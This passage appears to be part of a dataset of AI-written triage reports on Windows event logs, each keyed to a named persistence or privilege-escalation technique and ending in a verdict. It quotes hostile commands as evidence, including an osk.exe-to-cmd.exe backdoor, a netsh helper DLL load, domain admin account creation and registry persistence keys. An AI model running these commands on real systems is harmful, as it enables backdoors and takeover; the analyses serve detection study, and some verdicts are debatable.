4. **Repetitive Process Executions**:
   - Multiple initptions of processes like `wevtutil.exe` within a very short timeframe (`wevtutil.exe` is typically associated with Windows event logging operations) could indicate a cleanup of event logs or malicious tampering.

5. **Application Logs**:
   - Stopping of `edgeupdate` services repeatedly might not inherently be malicious but should be cross-examined with user actions or patches being applied.

### Conclusion:

Based on the identified patterns of process execution and command-line activity, particularly the use of `BITSAdmin` for external data retrieval and the context under which these operations are executing, there are several suspicious indicators that merit deeper investigation. Despite the lack of outright malicious indicators like known malware hashes, the behavior crosses into suspicious territory due to the nature and sequence of commands.

### Resolution:

**SUSPICIOUS**

### Recommendation:

1. **Conduct a deeper forensic analysis** of the host to trace back the origin of the `cmd.exe` and `BITSadmin.exe` activities. Check if there’s any unauthorized script or scheduled task executing these commands.
   
2. **Review user account activity** for `admin_test` to determine if it has been compromised or if any external unauthorized access attempts are logged elsewhere.

3. **Network traffic analysis** to monitor any unauthorized data exfiltration or incoming malicious payloads related to these operations.

4. **System integrity checks** to ensure no unauthorized alteration or tampering of files and services, particularly those that manage or affect system logs.

These steps should help clarify the context and intent of the suspicious activities noted in the logs and support any necessary incident response actions."
Office Application Startup - Outlook as a C2,"Upon analyzing the provided event logs, the following observations were made:

1. **Security Log:**
   - **EventID 4616**: Time changes were observed, which can be routine system maintenance. The changes were handled by ""svchost.exe"" running under ""LOCAL SERVICE,"" which usually operates with limited privilege. While time changes can sometimes be a red flag for malicious activity, in this context it seems benign.

2. **Sysmon Log:**
   - Several instances of common Windows utilities such as ""whoami.exe"", ""hostname.exe"", and ""reg.exe"" were run by the user ""SERVER002\\admin_test"" with high integrity. Running these utilities is not inherently suspicious but may indicate user activity or script execution.
   - The command `cmd.exe /c reg add...` directly manipulates the registry regarding Microsoft Office Outlook security settings, which can be indicative of script execution or an attempt to modify application security levels. It's not inherently malicious, but it does warrant further investigation.
   - The presence of multiple **conhost.exe** processes is typical and relates to command-line and console operations. Here, they appear linked to legitimate command executions but also merit context verification.

3. **Application Log:**
   - The entry from the ""Software Protection Platform Service"" appears routine, associated with licensing or Windows activation checks.

4. **System Log:**
   - Additional kernel and time service events corroborate the time change observed in the security log. The time source is ""time.windows.com,"" a typical valid source for time synchronization.

**Overall Assessment:**
- The analyzed logs reveal some potentially suspicious activity related to the use of command-line utilities and registry modifications. However, the use of common utilities with no overtly malicious signatures suggests potential benign administrative or script activity. No definitive markers indicate malicious activity, such as executing unknown binaries or leveraging known exploit techniques.

**Resolution:**
- **SUSPICIOUS**: While the activities could be benign, particularly in an administrative or script-heavy environment, the registry modification and command executions should be confirmed for intended activity. Further investigation is warranted to ensure no scripts or tools executed are being leveraged for unauthorized access or privilege modification. It would be prudent to verify changes with the responsible user or administrator and ensure system integrity to confirm that these are authorized actions."
Create Symbolic Link From osk.exe to cmd.exe,"### Analysis

#### System Log:

1. **Time Change Events**:
   - There are multiple `EventID: 24` and `EventID: 1` (Kernel-General) log entries related to changes in system time, which were executed by `svchost.exe`. These events indicate that the system time was adjusted from `2024-10-27 13:54:24.2555112` to `2024-10-27 13:54:16.9883766`. This can occur due to legitimate actions, such as synchronization with an NTP server, but if not expected, can be used to tamper time-based security mechanisms.
   - **Note**: The adjustments are small, implying potential time synchronization rather than tampering.

2. **Time Service Events**:
   - `EventID: 35` (Microsoft-Windows-Time-Service) indicates synchronization with the time source `time.windows.com`. Again, a common and benign occurrence unless further patterns in exploitation are identified.

#### Sysmon Log:

1. **Process Creation**:
   - The entries indicate `HOSTNAME.EXE`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe` being executed. The usage of `whoami.exe` and `wevtutil.exe` is common, typically to check user details and Windows event logs, possibly by IT or administrative users.
   - **Critical Command Execution**: A `cmd.exe` executing a suspicious command: 
     ```
     ""cmd.exe"" /c IF NOT EXIST %%windir%%\System32\osk.exe.bak (copy %%windir%%\System32\osk.exe %%windir%%\System32\osk.exe.bak) ELSE ( pushd ) & takeown /F %%windir%%\System32\osk.exe /A & icacls %%windir%%\System32\osk.exe /grant Administrators:F /t & del %%windir%%\System32\osk.exe & mklink %%windir%%\System32\osk.exe %%windir%%\System32\cmd.exe
     ```
     - **Analysis**:
       - This command involves taking ownership of `osk.exe` (On-Screen Keyboard), modifying its permissions, deleting it, and creating a symbolic link to `cmd.exe`.
       - This is a known privilege escalation technique using the accessibility tools trick, allowing an attacker to exploit the ""Ease of Access"" feature at the login screen to gain a command prompt as SYSTEM.

#### Security Log:

1. **Privilege Use**:
   - `EventID: 4672` indicates the user `admin_test` logging in with high privileges (which include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). Combined with the suspicious command above, this suggests activity meant to manipulate or escalate privileges.
   
2. **Logon and Logoff Events**:
   - Frequent logon (Event ID 4624) and logoff (Event ID 4634) events around the period in question are not abnormal, yet in conjunction with the command execution, can indicate further signs of a testing ground or exploitation taking place.

### Conclusion

- **Key Findings**: 
  - The existence of the command attempting to exploit the osk.exe to cmd.exe is a clear sign of an attempted privilege escalation taking advantage of accessibility features.
  - The user `admin_test` having highly privileged tokens and the timing of command execution suggests deliberate malicious intent rather than typical administrative tasks.

### Resolution: MALICIOUS

**Guidance**:

1. **Immediate Actions**:
   - Investigate the `admin_test` user account for unusual activities, access logs, or unauthorized access.
   - Perform a thorough scan for additional suspicious activity or unauthorized changes on the system.

2. **Long-Term Measures**:
   - Address any identified vulnerabilities, notably those related to privilege escalation vulnerabilities.
   - Review and strengthen monitoring of critical logs, ensuring alerts for unusual privilege escalation patterns.

3. **Coordinate with Incident Response**:
   - Collaborate with the incident response team to ensure containment and any necessary recovery measures are swiftly enacted."
Netsh Helper DLL Registration,"Upon analyzing the provided log entries from the Windows host, here is a detailed analysis focusing on potential indicators of malicious activity:

1. **Unusual Command Line Usage:**
   - There is a suspicious command executed via `cmd.exe`: `""cmd.exe"" /c netsh.exe add helper ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\NetshHelper.dll"" & taskkill /im notepad.exe /t /f > NUL 2>&1""`. This command attempts to load a DLL into the `netsh` tool, which is a common method used by attackers to execute malicious code. The command also includes the termination of `notepad.exe` instances, which could be used to hide activity.
   - Another command is `netsh.exe add helper ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\NetshHelper.dll""`. The addition of a network helper using netsh with a DLL from a temporary directory is suspicious and indicates potential code injection or persistence attempt.
   
2. **Potential DLL Injection:**
   - The use of `netsh` to load a potentially unauthorized DLL (`NetshHelper.dll`) from a temporary path is highly suspicious. Such activity could indicate an attempt to persist control over the system or to execute malicious payloads.

3. **Privilege and Integrity Level:**
   - The integrity level for these suspicious commands is marked as High, being executed under an administrative or elevated context (`SERVER002\\admin_test`). This indicates that the actions could potentially modify system settings or persist at a system level.

4. **Process Creations:**
   - Numerous instances of standard utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` executed by the same user (`SERVER002\\admin_test`) in quick succession. While these in isolation might be benign if performed for legitimate administrative purposes, their simultaneous execution alongside the suspicious commands listed suggests they might be used to gather information or configure the system as part of malware deployment.

5. **Edge Update Activity:**
   - There are logs related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`) and associated setup binaries. While these could be part of legitimate update processes, the presence of files in the `Temp` directory and repeated edge updates should be verified against scheduled update activities.

### Assessment and Conclusion:
Based on the presence of suspicious activity such as unauthorized DLL injection attempts using `netsh` and the potential misuse of administrative privileges for system configuration manipulation, there are clear signs that suggest a compromise or deployment of malicious payloads.

### Resolution:
- **MALICIOUS**: The activities documented in the logs indicate with high probability that malicious activity has occurred on the host.

### Guidance on How to Proceed:
- **Immediate Mitigation:** Isolate the affected system to prevent further spread of potential malware.
- **Forensic Analysis:** Conduct a thorough forensic investigation to determine the scope and impact of the potential breach, including examining other systems on the network for similar indicators of compromise.
- **Patch and Remediation:** Ensure the system is fully patched against known vulnerabilities. Reinstate any tampered system settings and remove unauthorized files (such as the suspicious DLL).
- **Review User Privileges:** Re-evaluate user privileges, especially those of `SERVER002\\admin_test`, to prevent excessive access.
- **Monitoring and Alerting:** Deploy enhanced monitoring on this host and across the network to detect similar activities in the future."
Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"After carefully analyzing the provided log entries from the Windows host, several key findings emerge indicating suspicious and potentially malicious activity. Here's a detailed breakdown:

### System Log Analysis:
1. **Time Change Events (EventIDs 24 and 1)**:
   - Events indicate a backward time change from ""2024-10-27 13:58:01"" to ""2024-10-27 13:57:55"". This type of event can occur during legitimate system operations but can also be indicative of anti-forensic actions where an attacker changes system time to obscure their tracks.

### Sysmon Log Analysis:
1. **Execution of whoami.exe and conhost.exe**:
   - While executing `whoami.exe` and `conhost.exe` isn't inherently malicious, multiple instances being run around the same time could suggest enumeration or preparation for another operation.
   
2. **Execution of cmd.exe with Registry Modifications (EventID 1)**:
   - A command execution involving `cmd.exe` that adds registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test` is highly suspicious. It involves registry operations which are often associated with attempts to establish persistence or hide malware within assistive technologies.

3. **Multiple Concurrent Instances of wevtutil.exe and conhost.exe**:
   - Multiple instances of `wevtutil.exe` suggest possible manipulation of event logs, which is commonly used by attackers to cover evidence of their activities.

4. **Unusual Execution of AtBroker.exe**:
   - The use of `AtBroker.exe` with suspicious command line arguments could imply attempts to leverage accessibility features for malicious purposes, as seen in the persistence payload attempted in the registry.

5. **Microsoft Edge Update Entries**:
   - Events related to Microsoft Edge updating with system-level integrity are considered normal; however, the close timing with potentially malicious activities should be scrutinized further but, given known patterns, it's likely benign as it follows expected update patterns.

### Security Log Analysis:
1. **System Time Change (EventID 4616)**:
   - Changes to system time recorded here correlate with the Sysmon logs, again pointing to potentially malicious actions intended to obscure activity timestamps.

### Assessment:
- **Key Indicators of Compromise**:
  - Backwards time manipulation can indicate anti-forensics.
  - The batch of registry modification commands suggests a setup for persistence through misuse of assistive technology features.
  - The operations involving `cmd.exe`, `wevtutil.exe`, and `AtBroker.exe` lead to a high suspicion of malicious intent due to the nature of the actions.

### Resolution:
Based on the evaluated evidence, the resolution for these log files is **MALICIOUS**. The registry modifications aiming to use accessibility features for persistence, coupled with time manipulation, clearly indicate malicious intent.

### Guidance:
- **Immediate Steps**:
  - Conduct an in-depth forensic analysis on `Server002` focusing on the persistence mechanisms, modified registry keys, and correlating any further network activity during this time.
  - Evaluate Active Directory and network logs around the timestamps to identify any lateral movement or external connections that coincide with the suspicious actions.
  - Isolate the affected host to prevent further exploitation or leakage of the current compromise.
- **Long-term Actions**:
  - Strengthen monitoring for backward time changes and registry modifications aligned with common attack techniques.
  - Implement restrictive policies around the use of assistive technologies and educate users about potential misuse.

COM hijacking via TreatAs,"Upon review of the provided logs, the following analysis identifies actions that indicate potentially malicious behavior:

1. **Suspicious PowerShell Activity:**
   - Multiple PowerShell entries in the logs show registry modifications associated with the creation of various registry keys under `HKEY_CURRENT_USER\SOFTWARE\Classes\fileTest` and `HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID`.
   - The executed command includes `rundll32.exe -sta ""fileTest""`, which can be an indicator of scriptlets being used to execute malicious code. 
   - The use of `scrobj.dll` in the registry keys can indicate a technique to execute scripts directly from registry keys, which is often used for persistence or bypassing traditional execution defenses.

2. **Use of External Scripts:**
   - The `ScriptletURL` registry key points to a remote file hosted on GitHub (`https://github.com/file/file-file/raw/master/files/data.015/src/TreatAs.sct`). This could be a scriptlet (possibly VBScript or JScript) that is often used to execute code from an external source, which is a common payload delivery method in attacks.

3. **Sysmon Logs Correlation:**
   - Multiple Sysmon events match the suspicious actions initiated by PowerShell. The `reg.exe` process, commanded by `powershell.exe`, added several registry entries, which aligns with the potential setup for a script-based attack.
   - The `rundll32.exe` process is seen executing `fileTest`, consistent with the commands present in PowerShell logs. This mechanism often disguises malicious actions as legitimate processes.

4. **High Integrity and Execution Context:**
   - Most processes ran with high integrity levels, indicating they have significant permissions on the system. 
   - The operations were executed by a user identified as `SERVER002\admin_test`, which suggests administrative privileges were used, increasing the risk of the system's compromise.

Given these observations, there is a clear indication of potentially malicious activity given the unauthorized registry modifications, the execution of scriptlets from external sources, and the execution using high permissions.

**Final Assessment: MALICIOUS**
- The processes observed are dubious, involving techniques commonly associated with malware attacks, specifically registry manipulation for persistence and executing scripts from URLs.
- Immediate steps should involve isolating the affected system, performing a comprehensive malware scan, examining the user `SERVER002\admin_test` activities, and auditing network traffic to IoC (Indicators of Compromise) mentioned in the logs.
"
Adding custom debugger for Windows Error Reporting,"Analyzing the logs provided, we can identify several key points and events that may give us insight into the potential concerns on the Windows host, Server002:

### System Log Analysis:
1. **Time Change Events**: Event IDs 24 and 1 pertain to time changes, executed by `svchost.exe`. Time changes can be indicative of malicious intent, such as trying to spoof logs or hide activities, but they are also common in routine operations, including daylight saving time adjustments or synchronization with time servers. The system time change has been logged, and the new time source is shown as `time.windows.com`.

### Sysmon Log Analysis:
1. **Common System Utility Usage**:
   - **Processes** like `hostname.exe`, `whoami.exe`, and `conhost.exe` show regular interaction within the system. While many processes appear normal, repetitive occurrences or batch sequence execution could suggest script or automated task usage.
   - **`wevtutil.exe` Process Execution**: This utility is used to manage Windows Event logs, and repeated execution could be normal in a maintenance schedule or potentially malicious if logs are being tampered with.
   - **`cmd.exe` with Registry Modification**: The command line logs indicate an aggressive registry modification using `cmd.exe` and `reg.exe`. The command `reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs"" /v Debugger /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f` indicates a change potentially used to manipulate or side-load during error reporting, which could be a method to hide the execution of external programs like `notepad.exe` instead of a debugger.

### Security Log Analysis:
- **Event ID 4616**: Records multiple time adjustments made by `svchost.exe`, which aligns with the system logs. These events reflect the aforementioned time change activities.

### Application Log Analysis:
- **Software Protection Platform Service**: The event refers to regular activity managed by Windows to maintain software licenses and integrity checks.

### Conclusion and Recommendation:
The analysis identifies one particularly concerning activity: an unauthorized registry modification that redirects a system debugger to `notepad.exe`. This is indicative of potentially malicious activity as it can hijack normal operations or obscure malicious behavior under the guise of legitimate processes.

**Resolution: MALICIOUS** – The presence of non-standard command-line operations manipulating the registry settings, possibly to enable persistence or stealth, is a strong indicator of malicious activity.

**Guidance**:
1. **Immediate Actions**:
   - Verify recent changes to the system and inspect critical logs for other modifications.
   - Isolate the system from the network if not done during this analysis period to prevent further spread or damage.
   - Review system integrity and undertake forensic analysis focusing on registry modifications and executable changes.

2. **Long-term Protections**:
   - Ensure comprehensive monitoring of the system utilizing more thorough Sysmon configurations or equivalent monitoring systems.
   - Educate users on identifying suspicious behavior to avoid inadvertent execution of scripts or commands that lead to such system modifications.
   - Review and tighten security policies related to command-line utility use and restrict access where possible. 

Further investigation should focus on understanding how such registry changes were deployed, ensuring they are rolled back and preventing further unauthorized modifications."
Powershell Execute COM Object,"**Detailed Analysis of Logs:**

1. **Time Change Logs**: 
   - Event ID 4616 indicates a change in the system time, observed in multiple entries. This could potentially be a concern as attackers sometimes alter system time to evade detection. However, there are no repeated or significant time discrepancies beyond these close time changes which are often seen during system adjustments. Normal system operations can also cause time adjustments due to synchronization processes.

2. **Privilege Logon Events**:
   - Event ID 4672 records for the user ""admin_test"" indicate privileged logons. This user accesses several high-level privileges. These can be normal for administrative users but are worth reviewing for legitimacy, especially given subsequent suspicious activities.

3. **Suspicious Command Execution**:
   - The PowerShell log reveals execution of a script designed to spawn `cmd.exe`, which then executes `calc.exe`. While launching `calc.exe` itself is benign, the method employed is unusual and indicative of a technique used in proof-of-concept attacks or potentially in a real attack to check execution capabilities. The PowerShell command uses COM objects for achieving this, which is indicative of PowerShell abuse.

4. **Process Creation and Execution**:
   - Sysmon Event 1 (Process creation) for `powershell.exe` confirms the execution of a suspicious script that aligns with the logs from the Windows PowerShell channel. This Powershell execution indicates possible unauthorized or unintended use which needs investigation.
   - Sysmon logs show multiple executions of `wevtutil.exe`, and `conhost.exe` by the same user ""admin_test"". While `wevtutil.exe` can be used for logs management, multiple rapid invocations without an apparent administrative task signal should be investigated to determine legitimacy.

5. **Logon Activity**:
   - Event IDs 4624 and 4634: Reflect numerous logons and logoffs from an account ""admin_test"". The use of NTLM authentication with a non-local IP address (`192.168.0.102`) is noted. This might suggest remote access which needs correlation with legitimate user activity or remote administration activities.

**Assessment and Conclusion**:

- The logs feature multiple indicators that suggest unusual and potentially malicious activity:
  - Unusual PowerShell usage to launch `cmd.exe` and execute `calc.exe`, reflecting a method often associated with script-based intrusions.
  - Privileged account (""admin_test"") performing questionable actions, including manipulation of system settings or logs, that do not conform to routine admin tasks.
  - Repeated use of `wevtutil.exe`, which although a legitimate tool, can also be used for log tampering.

Given the evidence, these entries suggest an alignment with tactics used in lateral movement or executing payloads internally.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Action**:
   - Lock down or audit the ""admin_test"" account and restrict power usage of sensitive tools like PowerShell.
   - Isolate the server from the network to prevent further potential lateral movement.
   
2. **Further Investigation**:
   - Perform a full forensic analysis of the system to look for indicators of compromise (IOC) beyond the logs, such as unusual file or network activity.
   - Correlate when unauthorized PowerShell scripts were run with known user or task schedules.
   - Review administrative logs and protocols to see if any unauthorized changes or anomalies exist.

3. **Enhanced Monitoring**:
   - Implement stricter monitoring of administrative accounts and activities, particularly focusing on PowerShell and command-line utility executions.
   - Enable logging for detection of anomalous behaviors and unusual process executions.

4. **Patch and Harden**:
   - Ensure all systems are up-to-date with security patches.
   - Use application whitelisting or similar to prevent unauthorized scripts or applications from running.

Taking the above steps will aid in mitigating the risk identified and securing the system from further exploitation."
Registry key creation and-or modification events for SDB,"To thoroughly assess the events captured in these logs, let's look for indicators of suspicious or malicious activity:

### Application Log:
- **Edgeupdate Service Stopped:** The service ""edgeupdate"" is repeatedly stopping. While not necessarily malicious, frequent stopping could indicate service manipulation or malfunctioning.
- **Software Protection Platform Service:** This entry appears normal; there is no evidence that indicates tampering or abnormal behavior.

### System Log:
- **Time Synchronization Events:** There's an unusual time change recorded twice within a very short time window. Intentional time setting adjustments can be associated with some malicious activities, but this event alone isn't definitive.
- **Changes in Time Source:** The time source is set to ""time.windows.com"", which is standard practice.

### Sysmon Log:
- **Process Execution:**
  - A host of processes related to Microsoft Edge Update (MicrosoftEdgeUpdate.exe) are executed, showing legitimate update operations. Each process has a valid parent and command line, consistent with normal operations.
  - PowerShell activity: There is an event triggering a custom registry item update using PowerShell. The `New-ItemProperty` operation on registry entries within ""AppCompatFlags"" could be a method to load compatibility settings, which may be suspicious if done without the administrator's knowledge. However, it lacks further context to determine if it's truly malicious.
  
### Windows PowerShell Log:
- The creation of new registry properties through PowerShell could potentially be used to manipulate application compatibility settings. However, it's not inherently malicious without evidence of further intent or actions.

### Security Log:
- **User Privilege Assignment (4672):** The assignment of numerous privileges to the user ""admin_test"", including `SeDebugPrivilege`, `SeBackupPrivilege`, could be expected for an admin account, but it could be problematic if the user isn't supposed to have high-level control or if the account itself is compromised.
- **Authentication (4624):** A logon event highlighting the user's credentials; no anomalies with the use of NTLM authentication.
- **Account Logout (4634):** A logout event for the user ""admin_test"" is recorded, expected following session termination or logoff commands.

### Assessment:
- **PowerShell Script Registry Changes:** The use of PowerShell to modify registry keys can be a technique used by malware to maintain persistence or configure system-level settings in a way that benefits an attacker. The exact purpose and source of this script are unclear and should be further investigated given its potential implications.
- **Service Stopping:** Frequent stopping of ""edgeupdate"" could raise concerns if it's part of unusual behavior or services being manipulated.

### Final Assessment: SUSPICIOUS
The logs contain activity that merits further investigation:
1. **PowerShell Activity:** Registry modifications without clear context could indicate an attempt at persistence or system changes by malicious actors.
2. **EdgeUpdate Service:** Frequent stopping might indicate service disruption or manipulation.
3. **Analysis of User Privileges and Authentication:** Verify that the user's administrative privileges are justified.

### Suggested Actions:
- Investigate the origin and legitimacy of the PowerShell commands that modify registries.
- Audit the account and privileges of ""admin_test"" to ensure no unauthorized changes have occurred.
- Evaluate if there's any insider threat or policy violation leading to service manipulation. Consider system-wide malware checks if the PowerShell activity raises additional red flags.
- Monitor network traffic to/from this host for any suspicious connectivity patterns. 

Although no definitive evidence of malicious activity, these logs suggest deeper scrutiny could reveal potential unauthorized or unusual configuration changes."
Create a new Windows domain admin user,"Upon analyzing the provided Windows event logs, here is a summary of observations, followed by a conclusion as to whether the behavior captured in the logs is benign, suspicious, or malicious.

### Summary of Observations:

#### System Logs:
- The system log entry shows time adjustments between `NewTime` and `OldTime`, which seems to involve the `svchost.exe` process. This is typically related to time synchronization activities, commonly seen on Windows systems and not inherently suspicious on its own.

#### Application Logs:
- Log entries related to `edgeupdate` indicate that some services stopped. These actions are not uncommon as services start and stop for various reasons, such as updates or maintenance tasks.

#### Sysmon Logs:
- Multiple entries indicate the execution of typical Windows processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `svchost.exe`. These alone appear routine.
- However, one specific entry capturing `cmd.exe` execution with the command line `""cmd.exe"" /c net user ""data.002_Admin"" ""data_pass123!"" /add /domain & net group ""Domain Admins"" ""data.002_Admin"" /add /domain` signifies the addition of a new user with domain admin privileges.
- Further entries log `net` and `net1`, which complement the `cmd.exe` action mentioned above.

#### Security Logs:
- The security logs show the assignment of extensive privileges to the `admin_test` account, including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, among others. This indicates the account holds significant authority, common for admin roles, but in combination with other actions, it raises flags.

### Assessment and Conclusion:
The critical observation centers on the execution of commands that added a new domain user with administrative privileges. This string of events (process creations and command executions) is often indicative of a malicious activity pattern that involves unauthorized user account creation or privilege escalation.

### Conclusion:
- **Resolution: MALICIOUS**
  
The creation of a domain admin account suggests unauthorized access and potential lateral movement or persistence attempt by an attacker. Even though admin actions can involve account management, such explicit entries with potential privilege abuse align with common attack vectors. It's imperative to immediately investigate the source of this command, review recent activities by `admin_test`, and assess if this aligns with any known administrative operations or if it suggests compromise.

### Guidance:
- Investigate the context of the `admin_test` account's recent activities and validate if such actions were legitimate.
- Review account creations and privilege changes across the domain for any unauthorized actions.
- Conduct a thorough security audit of Server002 and associated systems to ensure no further compromise.
- Consider resetting credentials for potentially affected accounts and enhancing monitoring and access controls."
HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"Upon analyzing the provided Windows event logs, several activities stand out that could potentially indicate malicious activity:

1. **PowerShell Activity**: The Windows PowerShell logs include the execution of the following command:
   ```
   powershell.exe & {New-ItemProperty -Path ""HKLM:\\Software\\Microsoft\\Command Processor"" -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""}
   ```
   This command alters the registry to change the `AutoRun` property, which is frequently associated with persistence mechanisms used in malware. The fact that this is being done with PowerShell, a common attack vector, further raises suspicion.

2. **Process Execution and Integrity Levels**: The Sysmon logs show the execution of several legitimate processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe` under the `admin_test` user with a ""High"" integrity level, indicating potential privilege escalation. While these processes are legitimate, their execution method and sequence may suggest an attempt to explore system details or manipulate events.

3. **Regular Microsoft Edge Updates**: The logs indicate multiple executions related to ""Microsoft Edge Update"". While regular updates are typical, the frequent references to temporary directories and a mix of system and application contexts might need further exploration to ensure there are no hijacked binaries involved.

4. **Time Change Events**: There are Event IDs 4616 in the Security log indicating system time changes by the `LOCAL SERVICE`. Time changes are sometimes used to evade time-based security mechanisms or logging.

5. **Absence of Clear Malicious Indicators**: While the activities identified are unusual, there is no conclusive evidence of malware or compromises, such as executions known to derive from malicious software or clearly malicious files being executed.

**Final Assessment**:
- **Resolution**: **SUSPICIOUS**

**Recommendations**:
- **Further Investigation**: Conduct a deeper forensic analysis, including examining the PowerShell execution history, registry changes, and consistency of edge updates. It would also be prudent to review user account activity to determine why `admin_test` is running high-integrity processes.
- **Security Measures**: Implement enhanced monitoring of PowerShell activity and check for any unauthorized registry changes. Ensure that logging is correctly capturing all relevant details of process executions and potential persistence mechanisms.
- **Regular Security Audit**: Regularly audit system configurations, user privileges, and update mechanisms to ensure no unauthorized changes have been made.

Despite the potentially suspicious activity, without further specific indicators, it's premature to classify these findings as conclusively malicious."
Change Default File Association,"Based on the analysis of the provided Sysmon and Application logs, the following observations have been made:

1. **Use of Built-in Utilities:**
   - The logs show the use of built-in Windows utilities such as `whoami.exe` and `wevtutil.exe` by the user `SERVER002\admin_test`. These tools themselves are not malicious, but if their usage is unexplained or unauthorized, it may indicate potential reconnaissance or tampering with event logs respectively.

2. **Program Executions:**
   - Multiple instances of Microsoft Edge Update processes were executed, such as `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`. These processes running with `NT AUTHORITY\SYSTEM` are consistent with legitimate software update or installation activities.

3. **Command Line Execution:**
   - There is a notable use of `cmd.exe` to change file associations (`assoc .hta=txtfile`). This action may indicate an attempt to prevent `.hta` files from being executed, potentially as a mitigation against malicious scripts using Hypertext Applications.
   - The command line execution with `cmd.exe` in the logs might suggest script-based or automated tasks running on the system under the administrative context of `SERVER002\admin_test`.

4. **Process Integrity Levels:**
   - The integrity levels of processes seem appropriate (e.g., `NT AUTHORITY\SYSTEM` processes have `System` integrity), and no unusual privilege escalations are apparent.

5. **Updates and Installations:**
   - Several processes related to Microsoft Edge updates and installations are evident. This activity involves the use of Edge Update executables, which align with normal update procedures.

6. **Application Log Entries:**
   - The service-related message ""Service stopped"" for an unspecified service could be part of the update process where services are often restarted, particularly with software updates.

7. **General Activity:**
   - The activities observed do not show any definitive signs of malware execution, privilege escalation, or lateral movement. The logs, primarily involving system updates and benign administrative commands, do not exhibit any behaviors typically associated with compromise.

**Assessment and Resolution:**

- Based on the extracted log entries, there is no explicit indication of malicious activity. The observed actions such as system updates, and utility executions appear to fall within the range of normal administrative and system maintenance operations.

**Resolution:**
- **BENIGN**: The logs contain activities consistent with legitimate administrative tasks and system updates with no apparent indications of malware or compromise. No further immediate action is required unless these actions are inconsistent with typical administrative operations for this environment.

**Guidance:**
- It is recommended to maintain vigilance by continuously monitoring logs and ensuring that similar activities align with authorized administrative actions.
- If the usage context of tools like `wevtutil.exe` is unclear, advising on validating administrator actions against organization policies may be prudent to ensure no deliberate tampering of event logs."
Install Outlook Home Page Persistence,"After analyzing the provided Windows event logs, here is a detailed assessment:

### Suspicious or Anomalous Behavior:

1. **Registry Modification using CMD and REG.EXE**:
   - At `2024-10-25 16:09:16.0893131`, there is a Sysmon event indicating the execution of `cmd.exe` with a command line argument that involves `reg.exe` to modify a registry key related to Microsoft Outlook's WebView feature. The command attempts to add a URL value that points to a local `html` file in a temp directory.
   - Such registry modifications can be used to execute persistence techniques or documents loading external content which could be a red flag if not initiated by a legitimate admin task.

2. **Frequent use of `wevtutil.exe`**:
   - There are multiple events in the Sysmon log involving the execution of `wevtutil.exe`. This utility is often used for managing event logs. While it can be benign, its frequent use alongside `conhost.exe` could be suspicious, indicating possible log tampering or enumeration activities.

3. **Processes running under a high integrity level**: 
   - The processes such as `hostname.exe`, `whoami.exe`, and others running with high integrity might indicate that these were executed with elevated privileges. While not necessarily malicious, it could indicate either normal administrative activity or a possible privilege escalation attempt if coupled with other suspicious activities.

4. **Timing of Event Occurrences**:
   - The events surrounding the time synchronization and slight shifts in time (`EventID 1 and 24` from the Kernel-General) appear consistently, which might suggest a normal syncing operation. However, it’s worth confirming no substantial time manipulation was done maliciously.

### Indicators of Malicious Activity:

- The primary concern in this log set centers around the registry modification by invoking `reg.exe` via `cmd.exe`. This action could result in the alteration of system or application behavior, especially involving Outlook settings. If not part of a planned configuration change or admin task, this could indicate malicious activity aimed at altering application behavior, potentially for phishing or redirection purposes.

### Conclusion:

- **Resolution: SUSPICIOUS**
  - The logs do not conclusively indicate malicious activity, but the use of `cmd.exe` and `reg.exe` to modify registry entries coupled with the use of `wevtutil` could suggest possible malicious intent, such as establishing persistence or executing potentially harmful content.
  
### Recommendations:

1. **Investigate the Source of the Registry Modification**:
   - Verify if the modification to the Outlook registry key was intended by the system administrator or application settings. Check related changes or logs around similar times for signs of intrusion.

2. **User Validation**:
   - Confirm whether the actions taken by `admin_test` are legitimate. Review user activity logs and interview the user if necessary.

3. **Monitor and Audit Logs**:
   - Given the use of `wevtutil`, ensure that no logs have been tampered with. Cross-reference with backup logs if available.

4. **Conduct a Threat Hunt**:
   - Perform further analysis of system behaviors and network traffic around the event times to search for unrecognized patterns or connections.

5. **Implement Alerts**:
   - Set up alerts for similar command executions and registry changes, especially those modifying paths or URLs, to quickly detect and mitigate potential threats.

Further investigation is needed to conclude the intent behind activities logged and ensure the system's integrity is uncompromised."
GlobalFlags in Image File Execution Options,"### Analysis of Logs

#### System Log Analysis
- The system log entries primarily show time adjustments and service activities. These events seem to be occurring at regular intervals and are typical of system time synchronization. 
- Event ID 24 and 1 from Microsoft-Windows-Kernel-General indicate time adjustments handled by `svchost.exe`, which is common for time service activities.

#### Application Log Analysis
- The application log entries include services starting and stopping, particularly focused around the ""edgeupdate"" service stopping and a record from the Software Protection Platform Service. Both are routine and expected actions for applications checking for updates or finishing update tasks.

#### Sysmon Log Analysis
- The Sysmon logs show a series of process creations and modifications. Most notably, we observe:
  - Multiple instances of `whoami.exe` and `HOSTNAME.EXE` being executed. These commands are often used for information gathering but can also be benign when executed by legitimate users for administrative tasks.
  - Repeated use of `wevtutil.exe`, a command-line utility for managing event logs, might hint at logs being queried or even cleared, which may warrant further investigation based on frequency and context.
  - The entry for `powershell.exe` shows a potentially malicious script that attempts to create or modify registry entries for a ""SilentProcessExit"" event with an execution trigger to launch `cmd.exe /c calc.exe`. This indicates an attempt to use Image File Execution Options (IFEO) to subvert normal process execution behaviors and potentially execute malicious payloads, though in this case, it seems to result in launching a benign calculator application. 

#### Security Log Analysis
